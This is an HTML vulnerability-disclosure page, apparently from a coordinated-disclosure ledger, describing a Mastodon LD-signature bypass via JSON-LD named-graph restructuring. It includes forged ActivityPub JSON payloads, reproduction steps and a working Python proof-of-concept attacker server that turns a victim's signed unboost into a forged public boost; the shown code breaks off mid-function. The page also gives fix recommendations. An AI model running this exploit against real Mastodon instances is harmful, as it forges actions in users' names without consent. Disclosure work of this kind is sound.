@@ -1,0 +1,817 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ANT-2026-P2DWB2SK · mastodon/mastodon</title>
+<link rel="icon" type="image/x-icon" href="/anthropic-serve/favicon.ico">
+<script>(function(){try{var t=localStorage.getItem("cvd_theme");if(t==="light"||t==="dark")document.documentElement.setAttribute("data-theme",t);}catch(e){}})();</script>
+<link rel="stylesheet" href="../assets/site.css">
+<link rel="stylesheet" href="../assets/ledger.css">
+</head>
+<body>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-MT0111843S"></script><script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() { dataLayer.push(arguments); }
+  gtag('js', new Date());
+  gtag('config', 'G-MT0111843S');
+</script>
+<main>
+<h1>ANT-2026-P2DWB2SK · mastodon/mastodon</h1>
+<nav class="site-nav muted">
+<a href="../index.html">Overview</a>  ·
+<a href="../ledger/index.html">Ledger</a>  ·
+<a href="../archive/index.html">Archive</a>  ·
+<a href="../about/index.html">About</a>  <span class="theme-toggle">
+    <button type="button" data-set-theme="light">Light</button>
+    <button type="button" data-set-theme="dark">Dark</button>
+    <button type="button" data-set-theme="system">System</button>
+  </span>
+</nav>
+<h2>
+  authenticity-not-verified
+  <span class="sev-badge sev-high">high</span>
+</h2>
+
+<p class="id-badges">
+  <a class="id-badge" href="https://nvd.nist.gov/vuln/detail/CVE-2026-46349">CVE-2026-46349</a>
+  <a class="id-badge" href="https://github.com/advisories/GHSA-chgx-jx3p-rf73">GHSA-chgx-jx3p-rf73</a>
+</p>
+
+<p class="sev-compare">
+  <span class="sev-compare-label">Severity</span>
+  <span class="sev-compare-item">Claude <span class="sev-chip sev-high">high</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Security research firm <span class="sev-chip sev-high">high</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Maintainer <span class="sev-chip sev-unknown">-</span></span>
+</p>
+
+<p class="attribution">Discovered by
+<span class="model-chip">Claude Mythos Preview</span></p>
+
+
+<div class="marker">REPORT</div>
+<p class="section-intro">Anthropic's analysis, sealed at approval. Disclosure to the maintainer was performed by Doyensec.</p>
+<div class="report-body" tabindex="0"><h1>ANT-2026-P2DWB2SK: LD-Signature bypass via JSON-LD named-graph restructuring</h1>
+<p><code>ActivityPub::LinkedDataSignature#verify_actor!</code> verifies signatures over the <strong>RDF canonicalization</strong> of a JSON-LD document, but Mastodon then <strong>dispatches</strong> on the raw JSON tree shape. These two views diverge for documents containing named <code>@graph</code> blocks, because <code>JsonLdHelper#canonicalize</code> pipes quads through <code>RDF::Graph.new</code>, which silently strips graph names.</p>
+<p>An attacker who observes <em>any</em> LD-signed activity with an embedded object — the canonical example being <code>Undo{Announce}</code> (an unboost) — can restructure the JSON to hoist the inner object (<code>Announce</code>) to the top level while pushing the outer wrapper (<code>Undo</code>) into a named <code>@graph</code>. The signature bytes are <strong>reused unchanged</strong>; the RDF triple set is identical; <code>verify_actor!</code> returns the victim; and <code>ProcessCollectionService</code> dispatches an <code>Announce</code> in the victim's name.</p>
+<p><strong>Demonstrated impact:</strong> Convert a victim's <code>Undo{Announce}</code> (unboost) into an <code>Announce</code> (boost) attributed to the victim, persisted to the database and federated as a public status. The same technique applies to <code>Undo{Follow}</code>, <code>Undo{Like}</code>, <code>Undo{Block}</code>, <code>Reject{Follow}</code> → <code>Follow</code>, etc. — any activity with a structurally complete embedded sub-activity.</p>
+<h2>Target</h2>
+<p><strong>Project:</strong> mastodon/mastodon<br>
+<strong>Commit:</strong> <code>73c43f476878aad1</code><br>
+<strong>Location:</strong> <code>app/lib/activitypub/linked_data_signature.rb:28</code><br>
+<strong>Discovery:</strong> static analysis — not yet dynamically reproduced  </p>
+<h2>Technical Details</h2>
+<p>JsonLdHelper#canonicalize does <code>RDF::Graph.new &lt;&lt; JSON::LD::API.toRdf(json)</code>; RDF::Graph represents a single unnamed graph and drops the graph_name component of incoming quads, so a document with the Undo moved into a named @graph yields exactly the same URDNA2015 N-Quads output and SHA-256 document_hash as the original. The signature therefore covers the RDF triple set, not the JSON tree shape that Activity.factory actually dispatches on, and embedding vs. IRI-referencing a node produces the same triple, letting the attacker freely rearrange the tree.</p>
+<h2>Reproduction</h2>
+<p>This finding was identified by static analysis and has not yet been dynamically reproduced. The Technical Details section above describes the code path; a trigger input is not included.</p>
+<p><em>[No reproducer or sanitizer output attached — request from security-cvd@anthropic.com if needed.]</em></p>
+<h2>Acknowledgement</h2>
+<p>This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-P2DWB2SK.</p>
+<hr>
+<p><strong>Reference:</strong> ANT-2026-P2DWB2SK<br>
+<strong>Anthropic CVD Policy:</strong> https://www.anthropic.com/coordinated-vulnerability-disclosure</p></div>
+
+<div class="marker">SECURITY RESEARCH FIRM ANALYSIS</div>
+<p class="section-intro">Triage and disclosure were performed by Doyensec. The writeup below is the document the firm sent to the maintainer.</p>
+<dl class="vendor-analysis">
+<dt>Verdict</dt><dd><span class="verdict-chip verdict-tp">true positive</span></dd><dt>Severity</dt><dd class="sev-high">high</dd></dl>
+<div class="report-body" tabindex="0"><h1>Vulnerability Report</h1>
+<h2>Vulnerability Header</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Vulnerability Title</strong></td>
+<td>LD-Signature Bypass via JSON-LD Named-Graph Restructuring</td>
+</tr>
+<tr>
+<td><strong>Severity Rating</strong></td>
+<td>High</td>
+</tr>
+<tr>
+<td><strong>Bug Category</strong></td>
+<td>Improper Verification of Cryptographic Signature (CWE-347)</td>
+</tr>
+<tr>
+<td><strong>Location</strong></td>
+<td><code>app/helpers/json_ld_helper.rb:102–105</code>, <code>app/lib/activitypub/linked_data_signature.rb:28</code></td>
+</tr>
+<tr>
+<td><strong>Affected Versions</strong></td>
+<td>All current versions</td>
+</tr>
+</tbody>
+</table>
+<h2>Executive Summary</h2>
+<p><code>ActivityPub::LinkedDataSignature#verify_actor!</code> verifies signatures over the URDNA2015 RDF canonicalization of incoming JSON-LD documents, but <code>ActivityPub::ProcessCollectionService</code> dispatches on the document's raw JSON tree shape. These two views diverge for documents containing named <code>@graph</code> blocks: <code>JsonLdHelper#canonicalize</code> processes quads through <code>RDF::Graph.new</code>, which silently discards graph names, causing two structurally different JSON-LD documents encoding the same RDF triple set to produce identical URDNA2015 output and therefore the same signature hash.</p>
+<p>An unauthenticated attacker who receives any LD-signed <code>Undo{Announce}</code> (an unboost) from a victim — obtained passively by following them from any federated server — can hoist the embedded <code>Announce</code> to the top level of the JSON and push the outer <code>Undo</code> into a named <code>@graph</code> block. The original signature bytes are reused unchanged, RSA verification passes, and <code>ProcessCollectionService</code> dispatches an <code>Announce</code> in the victim's name, creating a persistent public boost attributed to the victim on any target Mastodon instance. No cryptographic capability, no account on the target server, and no interaction from the victim during the attack are required. The <code>compact()</code> defense introduced for CVE-2022-24307 is orthogonal and does not mitigate this attack: <code>@graph</code> is a JSON-LD keyword, not a context-mapped term, and is preserved by compaction.</p>
+<p>Note on CVSS: the formal vector is <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N</code> (5.3 Medium) because the attacker's choice of boost target is constrained to what the victim previously signed (they cannot inject arbitrary content). The HIGH rating above reflects the architectural severity: this is a complete bypass of a cryptographic authentication primitive, requiring only JSON rearrangement, exploitable against any Mastodon instance in the victim's federation graph, with persistent and publicly visible consequences.</p>
+<h2>Root Cause Analysis</h2>
+<h3>Technical Description</h3>
+<p><code>LinkedDataSignature#verify_actor!</code> computes the document hash by calling <code>hash(@json.without('signature'))</code>, which in turn calls <code>canonicalize(obj)</code>:</p>
+<pre tabindex="0"><code class="language-ruby"># app/helpers/json_ld_helper.rb:102-105
+def canonicalize(json)
+  graph = RDF::Graph.new &lt;&lt; JSON::LD::API.toRdf(json, documentLoader: method(:load_jsonld_context))
+  graph.dump(:normalize)
+end
+</code></pre>
+<p><code>JSON::LD::API.toRdf</code> converts JSON-LD to an enumerable of <code>RDF::Statement</code> objects. When the input document contains a named graph — a node with both <code>@id</code> and <code>@graph</code> — the resulting statements are <strong>quads</strong>: they carry a <code>graph_name</code> component. <code>RDF::Graph</code> represents exactly one unnamed graph. When a quad is inserted via <code>&lt;&lt;</code>, the <code>graph_name</code> is silently discarded and the statement is stored as a plain triple in the default graph. This is documented <code>RDF::Graph</code> semantics, not a bug in the gem — but it is the wrong container for signature verification, which must operate over named-graph-aware datasets.</p>
+<p>The consequence is that two JSON-LD documents with <strong>different tree shapes</strong> but the <strong>same underlying RDF triple set</strong> produce byte-identical URDNA2015 output and therefore the same <code>document_hash</code>. By hoisting the embedded <code>Announce</code> from a captured <code>Undo{Announce}</code> to the top level and pushing the <code>Undo</code> into a named <code>@graph</code>, an attacker preserves every RDF triple exactly — the signature passes — while changing what the JSON dispatcher reads.</p>
+<p>The <code>compact()</code> call added for CVE-2022-24307 does not mitigate this. That fix defended against <code>@context</code> manipulation by re-compacting against Mastodon's own trusted context. Here, <code>@graph</code> is a JSON-LD <strong>keyword</strong> — immune to context remapping, preserved by <code>JSON::LD::API.compact</code>. The forged document's top-level <code>type: "Announce"</code> survives compaction intact.</p>
+<p>The divergence between signature verification and dispatch is visible in the code path:</p>
+<pre tabindex="0"><code class="language-ruby"># app/lib/activitypub/linked_data_signature.rb
+def verify_actor!
+  # ...
+  document_hash  = hash(@json.without('signature'))          # hashes RDF canonicalization
+  to_be_verified = options_hash + document_hash
+  creator if creator.keypair.public_key.verify(              # passes: same triples
+    OpenSSL::Digest.new('SHA256'), Base64.decode64(signature), to_be_verified)
+end
+
+# app/services/activitypub/process_collection_service.rb
+def call(body, actor, **options)
+  # ...
+  @json = compact(@json) if @json['signature'].is_a?(Hash)   # @graph survives compaction
+  # ...
+  verify_account!                                             # returns victim ✓
+  # ...
+end
+
+def process_item(item)
+  activity = ActivityPub::Activity.factory(item, @account, **@options)  # reads item['type'] = 'Announce'
+  activity&amp;.perform                                                       # Status.create!(account: victim, ...)
+end
+</code></pre>
+<h3>Attack Walkthrough</h3>
+<p><strong>1. Attacker observes a legitimate signed activity</strong></p>
+<p>When a victim unboosts a post, Mastodon emits a signed <code>Undo{Announce}</code> with <code>always_sign: true</code> (unconditional, in <code>app/services/remove_status_service.rb:106</code>) and broadcasts it to all followers. The attacker, following the victim from any federated server, receives:</p>
+<pre tabindex="0"><code class="language-json">{
+  &quot;@context&quot;: [&quot;https://www.w3.org/ns/activitystreams&quot;, &quot;https://w3id.org/security/v1&quot;],
+  &quot;id&quot;: &quot;https://victim.example/users/alice#announces/123/undo&quot;,
+  &quot;type&quot;: &quot;Undo&quot;,
+  &quot;actor&quot;: &quot;https://victim.example/users/alice&quot;,
+  &quot;to&quot;: [&quot;https://www.w3.org/ns/activitystreams#Public&quot;],
+  &quot;object&quot;: {
+    &quot;id&quot;: &quot;https://victim.example/users/alice/statuses/123/activity&quot;,
+    &quot;type&quot;: &quot;Announce&quot;,
+    &quot;actor&quot;: &quot;https://victim.example/users/alice&quot;,
+    &quot;published&quot;: &quot;2026-03-30T07:18:30Z&quot;,
+    &quot;to&quot;: [&quot;https://www.w3.org/ns/activitystreams#Public&quot;],
+    &quot;cc&quot;: [&quot;https://victim.example/users/alice/followers&quot;],
+    &quot;object&quot;: &quot;https://target.example/users/bob/statuses/456&quot;
+  },
+  &quot;signature&quot;: {
+    &quot;type&quot;: &quot;RsaSignature2017&quot;,
+    &quot;creator&quot;: &quot;https://victim.example/users/alice#main-key&quot;,
+    &quot;created&quot;: &quot;2026-03-30T07:18:30Z&quot;,
+    &quot;signatureValue&quot;: &quot;pyT13uUodTRbUJZa...&quot;
+  }
+}
+</code></pre>
+<p><strong>2. Attacker restructures — zero crypto required</strong></p>
+<p>The attacker hoists the inner <code>Announce</code> to the top level and pushes the <code>Undo</code> into a named <code>@graph</code>, referencing the <code>Announce</code> by IRI (which produces the same <code>&lt;undo&gt; as:object &lt;announce&gt;</code> RDF triple as embedding it):</p>
+<pre tabindex="0"><code class="language-json">{
+  &quot;@context&quot;: [&quot;https://www.w3.org/ns/activitystreams&quot;, &quot;https://w3id.org/security/v1&quot;],
+  &quot;id&quot;: &quot;https://victim.example/users/alice/statuses/123/activity&quot;,
+  &quot;type&quot;: &quot;Announce&quot;,
+  &quot;actor&quot;: &quot;https://victim.example/users/alice&quot;,
+  &quot;published&quot;: &quot;2026-03-30T07:18:30Z&quot;,
+  &quot;to&quot;: [&quot;https://www.w3.org/ns/activitystreams#Public&quot;],
+  &quot;cc&quot;: [&quot;https://victim.example/users/alice/followers&quot;],
+  &quot;object&quot;: &quot;https://target.example/users/bob/statuses/456&quot;,
+  &quot;@graph&quot;: [{
+    &quot;id&quot;: &quot;https://victim.example/users/alice#announces/123/undo&quot;,
+    &quot;type&quot;: &quot;Undo&quot;,
+    &quot;actor&quot;: &quot;https://victim.example/users/alice&quot;,
+    &quot;to&quot;: [&quot;https://www.w3.org/ns/activitystreams#Public&quot;],
+    &quot;object&quot;: &quot;https://victim.example/users/alice/statuses/123/activity&quot;
+  }],
+  &quot;signature&quot;: { &quot;...&quot;: &quot;IDENTICAL BYTES&quot; }
+}
+</code></pre>
+<p>Every RDF triple from the original document is present. The <code>Undo</code> triples become quads when parsed (with <code>graph_name = &lt;announce-id&gt;</code>), then <code>RDF::Graph</code> discards the graph name, producing the same triple set. URDNA2015 output is byte-identical; the hash matches; RSA verification passes.</p>
+<p><strong>3. Attacker delivers to the target inbox</strong></p>
+<p>The attacker POSTs the forged payload to <code>POST /target.example/inbox</code>, signing the HTTP request with their own key. The target Mastodon instance:</p>
+<ol>
+<li>Verifies the HTTP signature — passes (attacker's own valid key)</li>
+<li>Detects <code>actor ≠ HTTP signer</code> → falls through to LD-signature verification</li>
+<li>LD signature verifies — hash collision, same RDF triples</li>
+<li><code>verify_actor!</code> returns the victim's account</li>
+<li><code>Activity.factory</code> reads top-level <code>type: "Announce"</code> → <code>ActivityPub::Activity::Announce#perform</code></li>
+<li><code>Status.create!(account: victim, reblog: target_status, visibility: :public)</code></li>
+</ol>
+<p><strong>4. Outcome</strong></p>
+<p>A persistent, public boost attributed to the victim appears on the target server and is federated onward to the victim's followers there. The victim's original unboost is rendered permanently ineffective on that instance.</p>
+<h2>Exploitability Assessment</h2>
+<h3>Attack Vector &amp; Reachability</h3>
+<table>
+<thead>
+<tr>
+<th>Attack vector</th>
+<th>Network</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Authentication required</strong></td>
+<td>None — the attacker needs no account on the target server</td>
+</tr>
+<tr>
+<td><strong>User interaction required</strong></td>
+<td>None — the victim's routine use of the platform (unboosting) passively generates the ammunition; no victim action is required during or to trigger the attack</td>
+</tr>
+<tr>
+<td><strong>Reachable in default config</strong></td>
+<td>Yes — Mastodon emits LD-signed <code>Undo{Announce}</code> with <code>always_sign: true</code> unconditionally, regardless of <code>authorized_fetch_mode</code></td>
+</tr>
+<tr>
+<td><strong>Entry point</strong></td>
+<td><code>POST /inbox</code> — the standard ActivityPub inbox endpoint, internet-reachable by design as part of federation</td>
+</tr>
+</tbody>
+</table>
+<p>The attacker can create a fraudulent boost attributed to the victim on any Mastodon instance that accepts the activity (see the follower/content relationship constraints below). The forged status is permanent (persisted to PostgreSQL), public (<code>visibility: public</code>), and federated onward to the victim's followers on the target server. The attack is repeatable — once per captured <code>Undo{Announce}</code> — and can be delivered to multiple target instances. The boosted content is fixed by the original signature: the attacker can cause the victim to <em>appear to have re-boosted</em> whatever they had previously unboosted, but cannot make the victim boost unrelated content.</p>
+<p><strong>Acceptance condition on the target server:</strong> <code>ActivityPub::Activity::Announce#related_to_local_activity?</code> must return <code>true</code>. This holds when:
+- The boosted post is hosted on the target server (<code>reblog_of_local_status?</code>) — no follower relationship required, and the easiest test case; <strong>or</strong>
+- At least one local account on the target server follows the victim (<code>followed_by_local_accounts?</code>)</p>
+<p><strong>Scope note:</strong> Only <code>Undo{Announce}</code> is directly exploitable from Mastodon-generated payloads because it is the only Undo variant serialized with <code>always_sign: true</code>. Other Undo types (<code>Undo{Follow}</code>, <code>Undo{Like}</code>, <code>Undo{Block}</code>) would require LD-signed activities from other ActivityPub implementations that sign those payloads.</p>
+<h3>Reproduction Steps</h3>
+<p><strong>Environment</strong></p>
+<table>
+<thead>
+<tr>
+<th>Component</th>
+<th>Requirement</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Attacker server</td>
+<td>Internet-reachable server with a public domain and valid TLS certificate</td>
+</tr>
+<tr>
+<td>Victim account</td>
+<td>Any Mastodon account on a server <strong>different from the target</strong></td>
+</tr>
+<tr>
+<td>Target server</td>
+<td>Any Mastodon instance (the instance where the forged boost is delivered)</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>Critical:</strong> The victim account must be <em>remote</em> from the target server. If the victim is a local account on the target, the activity is processed via a different code path and the forgery fails.</p>
+</blockquote>
+<p>The simplest test setup: the boosted post belongs to the target server (<code>reblog_of_local_status?</code> returns <code>true</code>), eliminating the need for a local account on the target to follow the victim.</p>
+<p><strong>HTTPS setup for the attacker server</strong></p>
+<p><code>poc.py</code> listens on a plain HTTP port (default: 8080). Mastodon requires HTTPS with a valid TLS certificate for all federation traffic, so the attacker server needs a reverse proxy in front of it. The easiest option is <a href="https://caddyserver.com/">Caddy</a>, which handles TLS automatically via Let's Encrypt:</p>
+<pre tabindex="0"><code class="language-shell"># Install Caddy (Debian/Ubuntu)
+sudo apt install -y debian-keyring debian-archive-keyring apt-transport-https curl
+curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/gpg.key' | sudo gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg
+curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt' | sudo tee /etc/apt/sources.list.d/caddy-stable.list
+sudo apt update &amp;&amp; sudo apt install caddy
+
+# Start a reverse proxy — Caddy automatically obtains a TLS cert for your domain
+# (port 80/443 must be open and the domain must resolve to this server's IP)
+caddy reverse-proxy --from attacker.example.com --to localhost:8080
+</code></pre>
+<p>Alternatively, if Caddy is already installed, add this to your <code>Caddyfile</code> and run <code>caddy reload</code>:</p>
+<pre tabindex="0"><code>attacker.example.com {
+    reverse_proxy localhost:8080
+}
+</code></pre>
+<p><strong>Steps</strong></p>
+<pre tabindex="0"><code class="language-shell"># 1. Install dependencies and start the HTTPS reverse proxy (see above)
+pip install -r requirements.txt
+
+# 2. Establish federation: follow the victim (run once)
+python3 poc.py \
+    --domain  attacker.example.com \
+    --victim  https://victim-server.example.com/users/victim \
+    --inbox   https://target-server.example.com/inbox \
+    --follow
+
+# 3. On the victim account: boost any public post hosted on the target server,
+#    then unboost it. poc.py automatically receives the Undo{Announce},
+#    restructures it, and delivers the forged Announce to the target inbox.
+
+# 4. Visit the victim's profile from the target server and verify that
+#    the target post appears still boosted. On the other hand, the post should NOT
+#    appear when visiting the victim's profile on the victim's home server.
+</code></pre>
+<p><strong>Expected output</strong></p>
+<pre tabindex="0"><code>[*] Listening on port 8080 — waiting for Undo{Announce}...
+
+[+] Inbox: Undo from https://victim-server.example.com/users/victim
+[!] Signed Undo{Announce} — restructuring payload and firing
+
+[&gt;] Delivering forged Announce to https://target-server.example.com/inbox
+    actor  : https://victim-server.example.com/users/victim
+    object : https://target-server.example.com/users/.../statuses/...
+    sig    : https://victim-server.example.com/users/victim#main-key (reused, unmodified)
+[&lt;] 202 Accepted
+[+] Accepted — check the target server's database for a forged boost
+</code></pre>
+<p><strong>PoC files</strong></p>
+<ul>
+<li><code>poc.py</code> — minimal ActivityPub server; follows the victim, listens for the signed <code>Undo{Announce}</code>, restructures the payload, and delivers the forged <code>Announce</code> to the target inbox automatically. Run on the attacker-controlled HTTPS server.</li>
+</ul>
+<h2>Recommended Fix</h2>
+<p><strong>Option 1 — Reject <code>@graph</code> before LD-signature verification (recommended)</strong></p>
+<p>In <code>app/lib/activitypub/linked_data_signature.rb#verify_actor!</code>, add after the existing <code>return unless @json['signature'].is_a?(Hash)</code> guard:</p>
+<pre tabindex="0"><code class="language-ruby"># Named-graph and inclusion keywords allow structural forgery: different JSON tree,
+# same RDF triples. Mastodon never emits @graph or @included in signed activities;
+# their presence is a near-certain forgery indicator.
+return if @json.key?('@graph') || @json.key?('@included')
+</code></pre>
+<p>This has zero false-positive risk (confirmed: <code>grep -r '@graph' app/serializers/</code> returns no hits — Mastodon's own serializers never emit these keywords) and zero interop risk (no mainstream ActivityPub implementation uses <code>@graph</code> for single-activity delivery). Including <code>@included</code> covers a related restructuring possible with JSON-LD 1.1.</p>
+<p><strong>Option 2 — Defense-in-depth: also reject at <code>process_collection_service.rb</code></strong></p>
+<p>In <code>app/services/activitypub/process_collection_service.rb</code>, after the <code>compact()</code> call on line 15:</p>
+<pre tabindex="0"><code class="language-ruby"># If @graph survived compaction, the LD signature is structurally untrustworthy.
+return if @json.key?('@graph') || @json.key?('@included')
+</code></pre>
+<p><strong>Not recommended: replacing <code>RDF::Graph</code> with <code>RDF::Repository</code></strong></p>
+<p><code>RDF::Repository</code> preserves quad graph names and would be the architecturally correct fix, but would change the document hash for every signed document ever emitted by any Mastodon instance, breaking signature verification across the federation until all servers upgrade simultaneously.</p>
+<h2>References</h2>
+<ul>
+<li>CVE-2022-24307 — prior JSON-LD signature bypass in Mastodon via <code>@context</code> manipulation (orthogonal mechanism; the <code>compact()</code> fix for that issue does not mitigate this attack)</li>
+<li>CWE-347: Improper Verification of Cryptographic Signature</li>
+<li><a href="https://www.w3.org/TR/json-ld/#named-graphs">JSON-LD 1.0 §3.4 — Named Graphs</a></li>
+<li><a href="https://anthropic.com/security/cvd-policy">Anthropic CVD Policy</a></li>
+</ul>
+<h2>Attribution</h2>
+<p>This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by <strong>Savio</strong> at <strong>Doyensec</strong> in collaboration with Anthropic Research.</p>
+<p>For CVE credits and public acknowledgments: <strong>Doyensec in collaboration with Claude and Anthropic Research</strong></p>
+<h2>Attachment: <code>poc.py</code></h2>
+<pre tabindex="0"><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+Minimal ActivityPub attacker server — ANT-2026-04915 LD-sig bypass PoC
+
+Vulnerability: LD-Signature bypass via JSON-LD named-graph restructuring
+Affected:      app/lib/activitypub/linked_data_signature.rb
+               app/helpers/json_ld_helper.rb
+
+Root cause: JsonLdHelper#canonicalize uses RDF::Graph (single unnamed graph),
+which silently discards graph_name from quads. Two JSON-LD documents with
+different tree shapes but the same underlying triple set produce identical
+URDNA2015 output and therefore the same document_hash. An attacker can hoist
+an embedded Announce from a captured Undo{Announce} to the top level while
+pushing the Undo into a named @graph — the signature verifies unchanged, but
+ProcessCollectionService dispatches on the top-level 'type' = 'Announce'.
+
+Three servers are involved:
+  - Attacker server: where this script runs (must be HTTPS-reachable)
+  - Victim server:   home server of the victim account
+  - Target server:   Mastodon instance where the forged boost is delivered
+                     (must be DIFFERENT from the victim server — local accounts
+                      are not processed via the federated inbox code path)
+
+Usage:
+  pip install flask requests cryptography
+
+  # Step 1 — follow the victim (run once; establishes federation)
+  python3 poc.py \\
+      --domain  attacker.example.com \\
+      --victim  https://victim-server.example.com/users/victim \\
+      --inbox   https://target-server.example.com/inbox \\
+      --follow
+
+  # Step 2 — listen for the Undo{Announce} (run continuously)
+  python3 poc.py \\
+      --domain  attacker.example.com \\
+      --victim  https://victim-server.example.com/users/victim \\
+      --inbox   https://target-server.example.com/inbox
+
+  Then log into the victim account and boost any public post hosted on the
+  target server, then unboost it. The forged Announce is restructured and
+  delivered to the target inbox automatically.
+
+  The attacker server must be reachable over HTTPS from both the victim server
+  and the target server. Run it behind a reverse proxy (e.g. Caddy:
+  reverse_proxy localhost:8080) on a valid domain with a valid TLS certificate.
+
+  Simplest test setup: use a post on the TARGET server as the boost target.
+  This means reblog_of_local_status? is true on the target, so no local account
+  on the target needs to follow the victim.
+
+Note on keypair persistence: the keypair is saved to attacker_key.pem on first
+run and reloaded on subsequent restarts. Delete attacker_key.pem to rotate keys
+(then refresh the target's cached actor: tootctl accounts refresh attacker@...).
+&quot;&quot;&quot;
+
+import argparse
+import base64
+import hashlib
+import json
+import os
+import threading
+import time
+from email.utils import formatdate
+
+import requests
+from cryptography.hazmat.primitives import hashes, serialization
+from cryptography.hazmat.primitives.asymmetric import padding, rsa
+from flask import Flask, Response, jsonify, request
+
+app = Flask(__name__)
+
+# Filled in from CLI args at startup
+DOMAIN         = None
+ACTOR_URI      = None
+KEY_ID         = None
+VICTIM_URI     = None
+TARGET_INBOX   = None
+private_key    = None
+public_key_pem = None
+
+AS_CONTEXT = [
+    &quot;https://www.w3.org/ns/activitystreams&quot;,
+    &quot;https://w3id.org/security/v1&quot;,
+]
+
+
+# ── Crypto helpers ─────────────────────────────────────────────────────────────
+
+KEY_FILE = &quot;attacker_key.pem&quot;
+
+def generate_keypair():
+    global private_key, public_key_pem
+    if os.path.exists(KEY_FILE):
+        with open(KEY_FILE, &quot;rb&quot;) as f:
+            private_key = serialization.load_pem_private_key(f.read(), password=None)
+        print(f&quot;[*] Loaded keypair from {KEY_FILE}&quot;)
+    else:
+        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+        with open(KEY_FILE, &quot;wb&quot;) as f:
+            f.write(private_key.private_bytes(
+                serialization.Encoding.PEM,
+                serialization.PrivateFormat.TraditionalOpenSSL,
+                serialization.NoEncryption(),
+            ))
+        print(f&quot;[*] Generated new keypair, saved to {KEY_FILE}&quot;)
+    public_key_pem = private_key.public_key().public_bytes(
+        serialization.Encoding.PEM,
+        serialization.PublicFormat.SubjectPublicKeyInfo,
+    ).decode()
+
+
+def http_sign(method, url, body_bytes=b&quot;&quot;):
+    &quot;&quot;&quot;
+    Build HTTP Signature headers for an outgoing ActivityPub request.
+    Uses draft-cavage-06 with headers: (request-target) host date digest
+    &quot;&quot;&quot;
+    from urllib.parse import urlparse
+    parsed = urlparse(url)
+    date   = formatdate(usegmt=True)
+    digest = &quot;SHA-256=&quot; + base64.b64encode(hashlib.sha256(body_bytes).digest()).decode()
+
+    signing_string = &quot;\n&quot;.join([
+        f&quot;(request-target): {method.lower()} {parsed.path}&quot;,
+        f&quot;host: {parsed.netloc}&quot;,
+        f&quot;date: {date}&quot;,
+        f&quot;digest: {digest}&quot;,
+    ])
+
+    sig = base64.b64encode(
+        private_key.sign(signing_string.encode(), padding.PKCS1v15(), hashes.SHA256())
+    ).decode()
+
+    return {
+        &quot;Host&quot;:         parsed.netloc,
+        &quot;Date&quot;:         date,
+        &quot;Digest&quot;:       digest,
+        &quot;Content-Type&quot;: &quot;application/activity+json&quot;,
+        &quot;Signature&quot;: (
+            f'keyId=&quot;{KEY_ID}&quot;,'
+            f'algorithm=&quot;rsa-sha256&quot;,'
+            f'headers=&quot;(request-target) host date digest&quot;,'
+            f'signature=&quot;{sig}&quot;'
+        ),
+    }
+
+
+# ── Attack logic ───────────────────────────────────────────────────────────────
+
+def restructure(original):
+    &quot;&quot;&quot;
+    Restructure a signed Undo{Announce} into a forged Announce.
+
+    Original layout (what the victim signed):
+      { type: Undo, object: { type: Announce, object: &lt;status-uri&gt; } }
+
+    Forged layout (what ProcessCollectionService will dispatch):
+      { type: Announce, object: &lt;status-uri&gt;, @graph: [{ type: Undo, ... }] }
+
+    Why the signature still verifies:
+      - JSON::LD::API.toRdf emits the @graph node's statements as quads
+        with graph_name = &lt;announce-id&gt;.
+      - RDF::Graph.new strips graph_name on insert (it represents one unnamed
+        graph), so the quad becomes an ordinary triple.
+      - The resulting triple set is identical to the original document's.
+      - URDNA2015 output is byte-identical → SHA-256 hash matches → RSA verifies.
+
+    Why the dispatcher reads Announce:
+      - compact() preserves @graph (JSON-LD keyword, not a context-mapped term).
+      - ProcessCollectionService reads compacted['type'] = 'Announce'.
+      - Activity.factory dispatches ActivityPub::Activity::Announce#perform.
+    &quot;&quot;&quot;
+    inner = original[&quot;object&quot;]  # the embedded Announce dict
+
+    return {
+        &quot;@context&quot;:  original[&quot;@context&quot;],
+        # ── hoisted from inner Announce ──────────────────────────────────────
+        &quot;id&quot;:        inner[&quot;id&quot;],
+        &quot;type&quot;:      inner[&quot;type&quot;],         # &quot;Announce&quot;
+        &quot;actor&quot;:     inner[&quot;actor&quot;],
+        &quot;published&quot;: inner.get(&quot;published&quot;),
+        &quot;to&quot;:        inner.get(&quot;to&quot;, []),
+        &quot;cc&quot;:        inner.get(&quot;cc&quot;, []),
+        &quot;object&quot;:    inner[&quot;object&quot;],       # IRI string — same as:object triple
+        # ── Undo pushed into named @graph ────────────────────────────────────
+        # graph_name will be stripped by RDF::Graph, preserving all triples
+        &quot;@graph&quot;: [{
+            &quot;id&quot;:    original[&quot;id&quot;],
+            &quot;type&quot;:  original[&quot;type&quot;],      # &quot;Undo&quot;
+            &quot;actor&quot;: original[&quot;actor&quot;],
+            &quot;to&quot;:    original.get(&quot;to&quot;, []),
+            &quot;object&quot;: inner[&quot;id&quot;],          # IRI ref → same &lt;undo&gt; as:object &lt;announce&gt; triple
+        }],
+        # ── unchanged — no crypto required ───────────────────────────────────
+        &quot;signature&quot;: original[&quot;signature&quot;],
+    }
+
+
+def deliver(forged):
+    &quot;&quot;&quot;POST the forged Announce to the target server's inbox.&quot;&quot;&quot;
+    body = json.dumps(forged).encode()
+    hdrs = http_sign(&quot;POST&quot;, TARGET_INBOX, body)
